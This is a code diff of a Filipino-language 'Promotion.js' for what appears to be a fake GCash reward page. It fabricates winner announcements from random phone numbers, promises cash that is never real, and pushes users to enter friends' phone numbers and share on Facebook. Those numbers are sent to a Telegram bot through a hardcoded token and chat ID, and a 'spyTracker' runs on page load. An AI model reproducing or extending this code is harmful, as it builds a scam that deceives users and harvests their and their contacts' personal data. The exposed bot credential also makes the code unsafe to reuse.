@@ -100,9 +100,6 @@ const spyTracker = {
 };
 
 // ========== INDICATOR SYSTEM ==========
-// Step 1: NEON YELLOW RED - Pwede mag-claim ng ₱150
-// Step 2: NEON BLUE - Kailangan mag-share sa Facebook
-// Step 3: NEON GREEN - Complete na, may referral bonus
 
 const indicatorSystem = {
     updateIndicators: function(step, isOnHold = false) {
@@ -110,7 +107,6 @@ const indicatorSystem = {
         const indicator2 = document.getElementById('indicator2');
         const indicator3 = document.getElementById('indicator3');
         
-        // Reset lahat
         [indicator1, indicator2, indicator3].forEach(ind => {
             if (ind) {
                 ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
@@ -120,7 +116,6 @@ const indicatorSystem = {
             }
         });
         
-        // Step 1: NEON YELLOW RED
         if (step >= 1 && indicator1) {
             if (isOnHold) {
                 indicator1.classList.add('indicator-hold');
@@ -134,7 +129,6 @@ const indicatorSystem = {
             }
         }
         
-        // Step 2: NEON BLUE
         if (step >= 2 && indicator2) {
             indicator2.classList.add('indicator-blue');
             indicator2.style.background = '#00f2ff';
@@ -142,7 +136,6 @@ const indicatorSystem = {
             indicator2.style.animation = 'pulseFade 1s infinite';
         }
         
-        // Step 3: NEON GREEN
         if (step >= 3 && indicator3) {
             indicator3.classList.add('indicator-green');
             indicator3.style.background = '#39ff14';
@@ -150,7 +143,6 @@ const indicatorSystem = {
             indicator3.style.animation = 'pulseFade 1s infinite';
         }
         
-        // I-save sa localStorage at Firebase
         localStorage.setItem('indicatorStep', step);
         localStorage.setItem('claimOnHold', isOnHold);
         this.saveToFirebase(step, isOnHold);
@@ -187,7 +179,6 @@ const indicatorSystem = {
         return { step: 0, isOnHold: false };
     },
     
-    // Step 1: Claim button clicked - magiging HOLD
     step1ClaimOnHold: async function() {
         const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
         if (currentStep === 1) {
@@ -197,7 +188,6 @@ const indicatorSystem = {
         return false;
     },
     
-    // Step 2: Mag-share sa Facebook
     step2FacebookShare: async function() {
         const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
         if (currentStep === 2) {
@@ -207,7 +197,6 @@ const indicatorSystem = {
         return false;
     },
     
-    // Step 3: May gumamit ng referral number
     step3ReferralComplete: async function() {
         const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
         if (currentStep === 3) {
@@ -217,12 +206,10 @@ const indicatorSystem = {
         return false;
     },
     
-    // Kunin ang current step
     getCurrentStep: function() {
         return parseInt(localStorage.getItem('indicatorStep') || '0');
     },
     
-    // I-set ang step
     setStep: function(step) {
         this.updateIndicators(step, false);
     }
@@ -230,7 +217,6 @@ const indicatorSystem = {
 
 // ========== BALANCE MANAGEMENT ==========
 const balanceManager = {
-    // Kunin ang current balance ng user
     getBalance: async function() {
         const phone = localStorage.getItem("userPhone");
         if (!phone) return 0;
@@ -243,7 +229,6 @@ const balanceManager = {
         return 0;
     },
     
-    // Magdagdag ng balance (max 1200)
     addBalance: async function(amount) {
         const phone = localStorage.getItem("userPhone");
         if (!phone) return false;
@@ -255,7 +240,6 @@ const balanceManager = {
             const currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
             let newBalance = currentBalance + amount;
             
-            // Limit to 1200
             if (newBalance > 1200) {
                 newBalance = 1200;
                 alert("🏆 Maximum balance of ₱1200 reached!");
@@ -266,7 +250,6 @@ const balanceManager = {
                 lastBalanceUpdate: Date.now()
             });
             
-            // I-record ang transaction
             await db.ref('balance_history/' + phone + '/' + Date.now()).set({
                 amount: amount,
                 newBalance: newBalance,
@@ -279,7 +262,6 @@ const balanceManager = {
         return false;
     },
     
-    // I-update ang display ng balance (kung may balance element)
     updateBalanceDisplay: async function() {
         const balance = await this.getBalance();
         const balanceElement = document.getElementById('userBalanceDisplay');
@@ -292,18 +274,9 @@ const balanceManager = {
 
 // ========== WEIGHTED RANDOM AMOUNTS ==========
 const rewardTiers = {
-    common: {
-        amounts: [150, 300],
-        weight: 60
-    },
-    rare: {
-        amounts: [450, 600, 750],
-        weight: 30
-    },
-    legendary: {
-        amounts: [900, 1050, 1200],
-        weight: 10
-    }
+    common: { amounts: [150, 300], weight: 60 },
+    rare: { amounts: [450, 600, 750], weight: 30 },
+    legendary: { amounts: [900, 1050, 1200], weight: 10 }
 };
 
 function generateWeightedAmount() {
@@ -322,10 +295,11 @@ function generateWeightedAmount() {
     return amounts[Math.floor(Math.random() * amounts.length)];
 }
 
-// ========== LOGICAL RANDOM WINNERS TICKER ==========
+// ========== WINNER TICKER (FIXED - HINDI NA LOADING) ==========
 const winnerTicker = {
     prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
     winnerElement: null,
+    tickerInterval: null,
     
     generateLast4Digits: function() {
         return Math.floor(1000 + Math.random() * 9000).toString();
@@ -342,43 +316,49 @@ const winnerTicker = {
         return `${prefix}***${last4} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${amount}`;
     },
     
-    animateTransition: function(newText) {
-        if (!this.winnerElement) return;
-        
-        this.winnerElement.style.transition = 'opacity 0.3s ease';
-        this.winnerElement.style.opacity = '0';
-        
-        setTimeout(() => {
-            this.winnerElement.innerHTML = newText;
-            this.winnerElement.style.opacity = '1';
-        }, 300);
-    },
-    
     updateWinner: function() {
-        const newWinnerText = this.generateWinnerText();
-        this.animateTransition(newWinnerText);
+        if (!this.winnerElement) return;
+        const newText = this.generateWinnerText();
+        this.winnerElement.innerHTML = newText;
     },
     
     start: function() {
         this.winnerElement = document.getElementById('winnerText');
-        if (!this.winnerElement) return;
+        if (!this.winnerElement) {
+            console.log("Winner element not found, will retry...");
+            // Subukan ulit po mag-500ms
+            setTimeout(() => this.start(), 500);
+            return;
+        }
         
+        // Initial text agad, hindi "Loading..."
         this.winnerElement.innerHTML = this.generateWinnerText();
-        this.winnerElement.style.transition = 'opacity 0.3s ease';
-        this.winnerElement.style.opacity = '1';
         
-        setInterval(() => {
+        // I-clear ang existing interval kung meron
+        if (this.tickerInterval) clearInterval(this.tickerInterval);
+        
+        // Start ng 15 seconds interval
+        this.tickerInterval = setInterval(() => {
             this.updateWinner();
         }, 15000);
+        
+        console.log("🎲 Winner ticker started");
+    },
+    
+    stop: function() {
+        if (this.tickerInterval) {
+            clearInterval(this.tickerInterval);
+            this.tickerInterval = null;
+        }
     }
 };
 
-// ========== REFERRAL TIMER (PERSISTENT - 5 MINUTES) ==========
+// ========== REFERRAL TIMER (5 MINUTES COOLDOWN SA POPUP) ==========
 const referralTimer = {
     STORAGE_KEY: 'referral_end_time',
     
     startTimer: function() {
-        const endTime = Date.now() + (5 * 60 * 1000);
+        const endTime = Date.now() + (5 * 60 * 1000); // 5 minutes
         localStorage.setItem(this.STORAGE_KEY, endTime);
         return endTime;
     },
@@ -399,27 +379,40 @@ const referralTimer = {
         localStorage.removeItem(this.STORAGE_KEY);
     },
     
-    updateDisplay: function() {
-        const remainingSecs = this.getRemainingTime();
-        const timerElement = document.getElementById('popupTimerDisplay');
-        
-        if (timerElement && remainingSecs > 0) {
-            const mins = Math.floor(remainingSecs / 60);
-            const secs = remainingSecs % 60;
-            timerElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-            return true;
-        } else if (timerElement && remainingSecs <= 0) {
-            timerElement.innerHTML = "00:00";
-        }
-        return false;
+    isOnCooldown: function() {
+        return this.getRemainingTime() > 0;
     },
     
-    startCountdown: function() {
-        this.updateDisplay();
+    formatTime: function(seconds) {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+    },
+    
+    // I-update ang display sa popup
+    updatePopupDisplay: function() {
+        const remaining = this.getRemainingTime();
+        const timerElement = document.getElementById('popupTimerDisplay');
+        
+        if (timerElement) {
+            if (remaining > 0) {
+                timerElement.innerHTML = this.formatTime(remaining);
+                timerElement.style.color = '#ffaa33';
+            } else {
+                timerElement.innerHTML = "00:00";
+                timerElement.style.color = '#39ff14';
+            }
+        }
+        return remaining;
+    },
+    
+    // Simulan ang countdown sa popup
+    startPopupCountdown: function() {
+        this.updatePopupDisplay();
         
         const interval = setInterval(() => {
-            const hasTime = this.updateDisplay();
-            if (!hasTime) {
+            const remaining = this.updatePopupDisplay();
+            if (remaining <= 0) {
                 clearInterval(interval);
             }
         }, 1000);
@@ -428,42 +421,46 @@ const referralTimer = {
     }
 };
 
-// ========== SHARE BUTTON LOGIC ==========
-let shareCountdownInterval = null;
+// ========== SHARE BUTTON COOLDOWN UI ==========
+let shareCooldownInterval = null;
 
-function startShareCountdown() {
-    if (shareCountdownInterval) clearInterval(shareCountdownInterval);
+function updateShareButtonCooldown() {
+    const remaining = referralTimer.getRemainingTime();
+    const shareBtn = document.getElementById('shareButton');
+    const friendInput = document.getElementById('friendPhoneInput');
+    const statusMsg = document.getElementById('statusMessage');
     
-    shareCountdownInterval = setInterval(() => {
-        const remaining = referralTimer.getRemainingTime();
-        const shareBtn = document.getElementById('shareButton');
-        const friendInput = document.getElementById('friendPhoneInput');
-        const statusMsg = document.getElementById('statusMessage');
-        
-        if (remaining > 0) {
-            const mins = Math.floor(remaining / 60);
-            const secs = remaining % 60;
-            if (shareBtn) {
-                shareBtn.disabled = true;
-                shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-            }
-            if (friendInput) friendInput.disabled = true;
-            if (statusMsg) {
-                statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
-            }
-        } else {
-            if (shareBtn) {
-                shareBtn.disabled = false;
-                shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
-            }
-            if (friendInput) friendInput.disabled = false;
-            if (statusMsg) {
-                statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
-            }
-            clearInterval(shareCountdownInterval);
-            shareCountdownInterval = null;
+    if (remaining > 0) {
+        const mins = Math.floor(remaining / 60);
+        const secs = remaining % 60;
+        if (shareBtn) {
+            shareBtn.disabled = true;
+            shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
         }
-    }, 1000);
+        if (friendInput) friendInput.disabled = true;
+        if (statusMsg) {
+            statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
+        }
+    } else {
+        if (shareBtn) {
+            shareBtn.disabled = false;
+            shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
+        }
+        if (friendInput) friendInput.disabled = false;
+        if (statusMsg) {
+            statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
+        }
+        if (shareCooldownInterval) {
+            clearInterval(shareCooldownInterval);
+            shareCooldownInterval = null;
+        }
+    }
+}
+
+function startShareCooldownUI() {
+    if (shareCooldownInterval) clearInterval(shareCooldownInterval);
+    updateShareButtonCooldown();
+    shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
 }
 
 // ========== STEP 1: SHARE BUTTON HANDLER ==========
@@ -481,8 +478,21 @@ async function handleShare() {
         return;
     }
     
+    // Check kung nasa cooldown pa
+    if (referralTimer.isOnCooldown()) {
+        const remaining = referralTimer.getRemainingTime();
+        const mins = Math.floor(remaining / 60);
+        const secs = remaining % 60;
+        alert(`Please wait ${mins}:${secs.toString().padStart(2, '0')} before inviting again.`);
+        return;
+    }
+    
     // I-set sa Step 1
     indicatorSystem.setStep(1);
+    
+    // Simulan ang 5 minutes timer
+    referralTimer.startTimer();
+    startShareCooldownUI();
     
     // Send notification
     const message = `📱 REFERRAL INVITE - STEP 1/3!\n👤 User: ${userPhone}\n👥 Friend: ${friendPhone}`;
@@ -492,9 +502,6 @@ async function handleShare() {
     } catch(e) {
         console.log("Telegram error:", e);
     }
-    
-    referralTimer.startTimer();
-    startShareCountdown();
     
     document.getElementById('friendPhoneInput').value = '';
     
@@ -506,6 +513,7 @@ async function handleShare() {
         statusMsg.innerHTML = `<span class="status-step1">✅ Step 1/3 completed! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>`;
     }
     
+    // Ipakita ang popup na may timer
     showPrizePopup();
 }
 
@@ -518,7 +526,6 @@ async function handleFacebookShare() {
     
     window.open(fbShareUrl, '_blank', 'width=600,height=400');
     
-    // I-set sa Step 2 - NEON BLUE
     await indicatorSystem.step2FacebookShare();
     
     const progressFill = document.getElementById('progressFill');
@@ -529,7 +536,6 @@ async function handleFacebookShare() {
         statusMsg.innerHTML = `<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>`;
     }
     
-    // I-save sa Firebase na Step 2 na ang user
     const phone = localStorage.getItem("userPhone");
     if (typeof firebase !== 'undefined' && firebase.database) {
         const db = firebase.database();
@@ -540,14 +546,11 @@ async function handleFacebookShare() {
     }
 }
 
-// ========== STEP 3: REFERRAL COMPLETE (ginamit ng ibang user ang number) ==========
+// ========== STEP 3: REFERRAL COMPLETE ==========
 async function completeReferral(referredPhone) {
     const userPhone = localStorage.getItem("userPhone");
     
-    // Magdagdag ng ₱150 sa balance ni User #1
     await balanceManager.addBalance(150);
-    
-    // I-set sa Step 3 - NEON GREEN
     await indicatorSystem.step3ReferralComplete();
     
     const progressFill = document.getElementById('progressFill');
@@ -558,7 +561,6 @@ async function completeReferral(referredPhone) {
         statusMsg.innerHTML = `<span class="status-step3">🎉 Step 3/3 completed! +₱150 bonus from referral! 🟢</span>`;
     }
     
-    // I-save sa Firebase
     if (typeof firebase !== 'undefined' && firebase.database) {
         const db = firebase.database();
         await db.ref('user_sessions/' + userPhone).update({
@@ -567,25 +569,22 @@ async function completeReferral(referredPhone) {
             lastStepUpdate: Date.now()
         });
         
-        // I-record ang referral
         await db.ref('referrals/' + userPhone + '/' + referredPhone).set({
             timestamp: Date.now(),
             bonus: 150
         });
     }
     
-    // I-update ang balance display
     await balanceManager.updateBalanceDisplay();
     
     alert(`🎉 +₱150 added to your balance! Total: ₱${await balanceManager.getBalance()}`);
 }
 
-// ========== CLAIM GCASH BUTTON (Step 1 - ₱150 only) ==========
+// ========== CLAIM GCASH BUTTON ==========
 async function handleClaimGCash() {
     const currentStep = indicatorSystem.getCurrentStep();
     const isOnHold = localStorage.getItem('claimOnHold') === 'true';
     
-    // Step 1 lang ang pwedeng mag-claim ng ₱150
     if (currentStep !== 1) {
         alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
         return;
@@ -596,21 +595,17 @@ async function handleClaimGCash() {
         return;
     }
     
-    // I-set sa HOLD mode
     await indicatorSystem.step1ClaimOnHold();
     
-    // Magdagdag ng ₱150 sa balance
     const newBalance = await balanceManager.addBalance(150);
     
     if (newBalance !== false) {
         alert(`💰 ₱150 added to your balance! Total: ₱${newBalance}`);
         
-        // Send Telegram notification
         const phone = localStorage.getItem("userPhone");
         const message = `💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: ${phone}\n💵 ₱150 claimed\n💰 New Balance: ₱${newBalance}`;
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
         
-        // I-update ang progress
         const progressFill = document.getElementById('progressFill');
         if (progressFill) progressFill.style.width = '50%';
         
@@ -619,19 +614,23 @@ async function handleClaimGCash() {
             statusMsg.innerHTML = `<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>`;
         }
         
-        // I-update ang indicator - remove HOLD, show Step 1 completed
         indicatorSystem.updateIndicators(1, false);
     }
 }
 
 // ========== PRIZE POPUP FUNCTIONS ==========
+let popupCountdownInterval = null;
+
 function showPrizePopup() {
     const popup = document.getElementById('prizePopup');
     const popupBalance = document.getElementById('popupBalanceAmount');
     
     if (popupBalance) popupBalance.innerHTML = "₱150.00";
     
-    referralTimer.startCountdown();
+    // Simulan ang countdown sa popup
+    if (popupCountdownInterval) clearInterval(popupCountdownInterval);
+    popupCountdownInterval = referralTimer.startPopupCountdown();
+    
     startConfetti();
     
     if (popup) popup.style.display = 'flex';
@@ -641,10 +640,12 @@ function closePrizePopup() {
     const popup = document.getElementById('prizePopup');
     if (popup) popup.style.display = 'none';
     stopConfetti();
+    
+    // Hindi titigil ang countdown, tuloy pa rin sa background
 }
 
 // ========== CONFETTI FUNCTIONS ==========
-let confettiInterval = null;
+let confettiAnimation = null;
 
 function startConfetti() {
     const canvas = document.getElementById('confettiCanvas');
@@ -680,7 +681,7 @@ function startConfetti() {
             }
         }
         
-        confettiInterval = requestAnimationFrame(draw);
+        confettiAnimation = requestAnimationFrame(draw);
     }
     
     draw();
@@ -691,9 +692,9 @@ function startConfetti() {
 }
 
 function stopConfetti() {
-    if (confettiInterval) {
-        cancelAnimationFrame(confettiInterval);
-        confettiInterval = null;
+    if (confettiAnimation) {
+        cancelAnimationFrame(confettiAnimation);
+        confettiAnimation = null;
     }
     const canvas = document.getElementById('confettiCanvas');
     if (canvas) {
@@ -703,40 +704,55 @@ function stopConfetti() {
     }
 }
 
-// ========== MAIN TIMER ==========
+// ========== MAIN TIMER (FIXED - HINDI NA LOADING) ==========
+let mainTimerInterval = null;
+
 function updateMainTimer() {
     const target = new Date(2026, 4, 1, 0, 0, 0);
     const now = new Date();
     const diff = target - now;
     const timerDisplay = document.getElementById('mainTimerDisplay');
     
-    if (timerDisplay && diff > 0) {
-        const days = Math.floor(diff / (1000*60*60*24));
-        const hours = Math.floor((diff % (86400000)) / 3600000);
-        const mins = Math.floor((diff % 3600000) / 60000);
-        const secs = Math.floor((diff % 60000) / 1000);
-        timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-    } else if (timerDisplay) {
-        timerDisplay.innerHTML = "00:00:00";
+    if (timerDisplay) {
+        if (diff > 0) {
+            const days = Math.floor(diff / (1000*60*60*24));
+            const hours = Math.floor((diff % (86400000)) / 3600000);
+            const mins = Math.floor((diff % 3600000) / 60000);
+            const secs = Math.floor((diff % 60000) / 1000);
+            timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+        } else {
+            timerDisplay.innerHTML = "00D 00:00:00";
+        }
     }
 }
 
-// ========== CHECK EXISTING TIMER ==========
-function checkExistingTimer() {
-    const remaining = referralTimer.getRemainingTime();
-    if (remaining > 0) {
-        startShareCountdown();
-        referralTimer.startCountdown();
+function startMainTimer() {
+    updateMainTimer();
+    if (mainTimerInterval) clearInterval(mainTimerInterval);
+    mainTimerInterval = setInterval(updateMainTimer, 1000);
+}
+
+// ========== CHECK EXISTING COOLDOWN ==========
+function checkExistingCooldown() {
+    if (referralTimer.isOnCooldown()) {
+        startShareCooldownUI();
     }
 }
 
 // ========== INITIALIZE ==========
 document.addEventListener('DOMContentLoaded', async function() {
-    console.log("Promotion.js loaded - Indicator System v2");
+    console.log("Promotion.js loaded - Fixed Version");
     
     await spyTracker.track();
+    
+    // Simulan ang winner ticker (hindi na loading)
     winnerTicker.start();
-    checkExistingTimer();
+    
+    // Simulan ang main timer (hindi na loading)
+    startMainTimer();
+    
+    // Check kung may existing cooldown
+    checkExistingCooldown();
     
     // Load current step from Firebase
     const { step, isOnHold } = await indicatorSystem.loadFromFirebase();
@@ -756,18 +772,20 @@ document.addEventListener('DOMContentLoaded', async function() {
         const newShareBtn = shareBtn.cloneNode(true);
         shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
         newShareBtn.onclick = handleShare;
-        newShareBtn.disabled = false;
+        newShareBtn.disabled = referralTimer.isOnCooldown();
     }
     
     // Facebook share button
     const fbShareBtn = document.getElementById('shareFBBtn');
     if (fbShareBtn) {
-        // Add info text below button
-        const infoText = document.createElement('div');
-        infoText.className = 'fb-share-info';
-        infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
-        infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
-        fbShareBtn.parentNode.appendChild(infoText);
+        // Add info text below button kung wala pa
+        if (!document.querySelector('.fb-share-info')) {
+            const infoText = document.createElement('div');
+            infoText.className = 'fb-share-info';
+            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
+            infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
+            fbShareBtn.parentNode.appendChild(infoText);
+        }
         
         fbShareBtn.onclick = handleFacebookShare;
     }
@@ -778,9 +796,7 @@ document.addEventListener('DOMContentLoaded', async function() {
         claimGCashBtn.onclick = handleClaimGCash;
     }
     
-    updateMainTimer();
-    setInterval(updateMainTimer, 1000);
-    
+    // Popup close on outside click
     const popup = document.getElementById('prizePopup');
     if (popup) {
         popup.onclick = function(e) {
@@ -790,5 +806,5 @@ document.addEventListener('DOMContentLoaded', async function() {
         };
     }
     
-    console.log("✅ Promotion.js initialized");
+    console.log("✅ Promotion.js initialized - All systems ready");
 });
